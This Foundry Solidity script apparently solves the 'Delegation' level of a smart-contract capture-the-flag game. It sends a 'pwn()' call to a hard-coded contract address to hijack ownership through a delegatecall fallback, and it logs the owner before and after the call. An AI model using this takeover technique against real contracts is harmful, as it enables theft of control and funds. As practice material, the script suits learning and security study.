// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Delegation.sol";

contract DelegationScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        changeOwner();

        vm.stopBroadcast();
    }
    function changeOwner() public {
        Delegation target = Delegation(0x643cAf6b11926Ab930DE37F2583E35c9507f2635);
        console.log("before owner: ", target.owner());
        address(target).call(abi.encodeWithSignature("pwn()"));
        console.log("after owner: ", target.owner());
    }
}
